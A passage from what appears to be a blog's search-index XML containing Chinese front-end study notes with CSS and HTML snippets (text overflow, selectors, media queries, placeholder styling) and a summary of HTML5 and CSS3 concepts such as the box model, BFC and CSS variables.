class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 居中 */</span></span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line"><span class="comment">/* 位于底部 */</span></span><br><span class="line"><span class="attribute">margin-top</span>: auto;</span><br></pre></td></tr></table></figure><blockquote><h2 id="IE-兼容"><a href="#IE-兼容" class="headerlink" title="IE 兼容"></a>IE 兼容</h2></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 输入 cc:ie ，用于解决部分 IE 相关问题 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if IE]&gt;</span></span><br><span class="line"><span class="comment">  &lt;script&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><blockquote><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 目标选择器，一般是作为锚点，当定位到该标签后，该标签会发生变化 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:target</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置被选中的内容，发生改变，一般用于鼠标选中文字 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::selection</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h2 id="单行／多行文本溢出"><a href="#单行／多行文本溢出" class="headerlink" title="单行／多行文本溢出"></a>单行／多行文本溢出</h2></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">white-space</span>: nowrap;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line"><span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line"></span><br><span class="line"><span class="attribute">display</span>: -webkit-box;</span><br><span class="line">-webkit-line-clamp: <span class="number">2</span>;</span><br><span class="line">-webkit-box-orient: vertical;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line"><span class="attribute">text-overflow</span>: ellipsis;</span><br></pre></td></tr></table></figure><blockquote><h2 id="中英文换行"><a href="#中英文换行" class="headerlink" title="中英文换行"></a>中英文换行</h2></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 不换行 */</span></span><br><span class="line"><span class="attribute">white-space</span>: nowrap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 起一个新行来放置长单词 */</span></span><br><span class="line"><span class="attribute">word-break</span>: break-word;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 不会把长单词放在一个新行里，当这一行放不下的时候就直接强制断句了 */</span></span><br><span class="line"><span class="attribute">word-break</span>: break-all;</span><br></pre></td></tr></table></figure><blockquote><h2 id="aspect-ratio-与-object-fit-搭配的妙用"><a href="#aspect-ratio-与-object-fit-搭配的妙用" class="headerlink" title="aspect-ratio 与 object-fit 搭配的妙用"></a>aspect-ratio 与 object-fit 搭配的妙用</h2></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// aspect-ratio：为容器规定了一个期待的纵横比。</span></span><br><span class="line"><span class="comment">// object-fit：控制图片在容器中的显示形态，分别有：contain--完全展开并保持原始比例，fill--完全展开被拉伸铺满容器，cover--铺满容器并保持原始比例但被裁剪。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最完美的结合就是使用 aspect-ratio 设定需求的宽度和高度比，再通过设定 object-fit 值为 cover 使图片保持原来的形态，且使每个图片都保持相同的宽高。</span></span><br></pre></td></tr></table></figure><blockquote><h2 id="设置-placeholder-的字体样式"><a href="#设置-placeholder-的字体样式" class="headerlink" title="设置 placeholder 的字体样式"></a>设置 placeholder 的字体样式</h2></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Chrome */</span></span><br><span class="line"><span class="selector-tag">input</span>::-webkit-input-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.45</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mozilla Firefox 19+ */</span></span><br><span class="line"><span class="selector-tag">input</span>::-moz-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.45</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet Explorer 10+ */</span></span><br><span class="line"><span class="selector-tag">input</span>:-ms-input-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.45</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h2 id="file-accept"><a href="#file-accept" class="headerlink" title="file accept"></a>file accept</h2></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 自定义上传文件的后缀名：.customize --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ref</span>=<span class="string">&quot;inputFile&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">accept</span>=<span class="string">&quot;.customize&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">type</span>=<span class="string">&quot;file&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span></span></span><br><span class="line"><span class="tag">  @<span class="attr">change</span>=<span class="string">&quot;getFile&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><blockquote><h2 id="media-only-screen"><a href="#media-only-screen" class="headerlink" title="@media only screen"></a>@media only screen</h2></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 当屏幕尺寸 小于 1200px 时 */</span></span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">1200px</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当屏幕尺寸 大于 768px 时 */</span></span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当屏幕尺寸 大于 768px，小于 1200px 时 */</span></span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">768px</span>) <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">1200px</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h2 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h2></blockquote><h3 id="选择器-描述"><a href="#选择器-描述" class="headerlink" title="选择器 描述"></a>选择器 描述</h3><ul><li>[attr] 用于选取带有指定属性的元素</li><li>[attr&#x3D;value] 用于选取带有指定属性和值的元素</li><li>[attr~&#x3D;value] 用于选取属性值中包含指定词汇的元素</li><li>[attr|&#x3D;value] 用于选取带有以指定值开头的属性值的元素，该值必须是整个单词</li><li>[attr^&#x3D;value] 匹配属性值以指定值开头的每个元素。</li><li>[attr$&#x3D;value] 匹配属性值以指定值结尾的每个元素。</li><li>[attr*&#x3D;value] 匹配属性值中包含指定值的每个元素。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&#x27;text&#x27;</span>]</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&#x27;password&#x27;</span>]</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[class^=<span class="string">&#x27;icon-&#x27;</span>]</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h2 id="text-align-last"><a href="#text-align-last" class="headerlink" title="text-align-last"></a>text-align-last</h2></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 一段文本中最后一行在被强制换行之前的对齐规则 */</span></span><br><span class="line"><span class="attribute">text-align-last</span>: auto;</span><br><span class="line"><span class="attribute">text-align-last</span>: start;</span><br><span class="line"><span class="attribute">text-align-last</span>: end;</span><br><span class="line"><span class="attribute">text-align-last</span>: left;</span><br><span class="line"><span class="attribute">text-align-last</span>: right;</span><br><span class="line"><span class="attribute">text-align-last</span>: center;</span><br><span class="line"><span class="comment">/* justify：最后一行文字的开头与内容盒子的左侧对齐，末尾与右侧对齐 */</span></span><br><span class="line"><span class="attribute">text-align-last</span>: justify;</span><br></pre></td></tr></table></figure><blockquote><h2 id="文字间距"><a href="#文字间距" class="headerlink" title="文字间距"></a>文字间距</h2></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="comment">/* 单词抬头距离 */</span></span><br><span class="line">  <span class="attribute">text-indent</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="comment">/* 字间距 */</span></span><br><span class="line">  <span class="attribute">letter-spacing</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h2 id="网页标题栏添加图标"><a href="#网页标题栏添加图标" class="headerlink" title="网页标题栏添加图标"></a>网页标题栏添加图标</h2></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;shortcut icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;favicon.ico&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML5_CSS3实用知识</title>
      <link href="/archives/bf20bf29.html"/>
      <url>/archives/bf20bf29.html</url>
      
        <content type="html"><![CDATA[<blockquote><h2 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h2></blockquote><ul><li>标签兼容性：html5 很多标签在浏览器里面使用都有兼容性问题。另外，有些标签有自带样式且无法更改，如进度条标签的背景颜色等等。对于兼容性问题，我们可以创建自定义标签 <code>document.createElement(&#39;tagName&#39;)</code>。</li><li>输入域的表单列表：<code>datalist、option</code>。</li><li>自定义属性：<code>data-\</code>*，解决自定义属性混乱无管理的现状。<code>dom.dataset.xxx</code> 来获取和设置数据。</li><li>文件读取：通过 <code>FileReader</code> 对象可以读取本地存储的文件，使用 File 对象来指定所要读取的文件或数据。File 对象可以是来自用于一个 <code>&lt;input type=&quot;file&quot; /&gt;</code> 元素上选择文件后返回的<code> FileList</code> 对象，也可以来自由拖放操作生成的 <code>DataTransfer</code>。</li><li>a 标签使用注意事项：<code>&lt;a href=&quot;xxx&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt; XXX &lt;/a&gt;</code></li></ul><blockquote><h2 id="CSS3"><a href="#CSS3" class="headerlink" title="CSS3"></a>CSS3</h2></blockquote><ul><li>重点：背景设置、边框圆角及阴影、边框图片设置、文本修饰（阴影 <code>text-shadow</code>）、选择器（属性选择器、目标选择器<code> :target</code>、选中后改变背景颜色 <code>::selection</code>）、线性渐变和径向渐变（<code>linear-gradient、radial-gradient</code>）、2D 3D 转换（<code>transform</code>）、过渡（补间动画 <code>transition</code>）、动画（<code>animation</code>、<code>@keyframes</code>）、伸缩布局（<code>display: flex</code>）。</li><li><code>flex: auto</code>; –&gt; <code>flex-grow: 1; flex-shrink: 1; flex-basis: auto</code>;。</li><li><code>aspect-ratio</code>：<a href="https://zhuanlan.zhihu.com/p/348250741">https://zhuanlan.zhihu.com/p/348250741</a>。</li><li><code>backface-visibility</code>：指定当元素背面朝向观察者时是否可见。<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/backface-visibility">MDN</a></li><li><code>background</code>：属性被指定多个背景层时，使用逗号分隔每个背景层，<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background">https://developer.mozilla.org/zh-CN/docs/Web/CSS/background</a>。</li><li>盒子模型：由四个部分组成：<code>content</code>、<code>padding</code>、<code>border</code>、<code>margin</code>。<code>box-sizing</code> – 标准盒子模型：盒子总宽度 &#x3D; <code>width + padding + border + margin；</code>IE 怪异盒子模型：盒子总宽度 &#x3D; <code>width + margin</code>。</li><li>单位：在 css 单位中，可以分为相对长度单位（<code>em、ex、ch、rem、vw、vh、vmin、vmax、%、px</code>）、绝对长度单位（<code>cm、mm、in、pt、pc</code>）。</li><li>【1】CSS 像素（css pixel, px）: 适用于 Web 编程，在 CSS 中以 px 为后缀，是一个长度单位。在 CSS 规范中，长度单位可以分为两类，绝对单位以及相对单位。px - 一个相对单位，相对的是设备像素（device pixel）。【2】设备像素：又称为物理像素，指设备能控制显示的最小物理单位，不一定是一个小正方形区块，也没有标准的- 高，只是用于显示丰富色彩的一个“点”而已。单位为 pt。【3】设备独立像素（Device Independent Pixel）：与设备无关的逻辑像素，代表可以通过程序控制使用的虚拟- 素，是一个总体概念，包括了 CSS 像素。【4】dpr（device pixel ratio），设备像素比：代表设备独立像素到设备像素的转换关系，在 <code>JavaScript</code> 中可以通过 <code>window- devicePixelRatio</code> 获取。dpr &#x3D; 设备像素 &#x2F; 设备独立像素。</li><li><code>BFC（Block Formatting Context)</code>，即块级格式化上下文，它是页面中的一块独立渲染区域，并且有一套属于自己的渲染规则。<code>BFC </code>目的是形成一个相对于外界完全独立- 空间，让内部的子元素不会影响到外部的元素。</li><li>元素水平垂直居中：利用定位 + margin: auto；利用定位 + margin: 负值；利用定位 + transform；flex 布局；table 布局；grid 布局。</li><li>transition：并不是所有的属性都能使用过渡的，如 <code>display: none -&gt; display: block</code>。</li><li>减少回流和重绘：避免设置多项内联样式；使用 <code>position</code> 属性的 <code>fixed</code> 值或 <code>absolute</code>；避免使用 <code>table</code> 布局；使用 CSS3 硬件加速，可以让 <code>transform</code>、<code>opacity</code>- <code>filters</code> 这些动画不会引起回流重绘。</li><li>响应式界面：content is like water。实现响应式布局的方式：媒体查询、百分比、<code>vw / vh、rem</code>。</li><li>CSS 性能优化的实现可以从选择器嵌套、属性特性、减少 http 请求这三面考虑，同时还要注意 CSS 代码的加载顺序。</li><li>使用 CSS 形式实现视觉差滚动效果的方式：<code>background-attachment</code>、<code>transform: translate3D</code>。</li><li>CSS 变量：在 <code>:root</code> 选择器中声明变量【变量名称必须以两个破折号（–）开头，且区分大小写！】；<code>var()</code> 函数用于插入 CSS 变量的值，语法 –&gt; <code>var(name, value)</code>。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
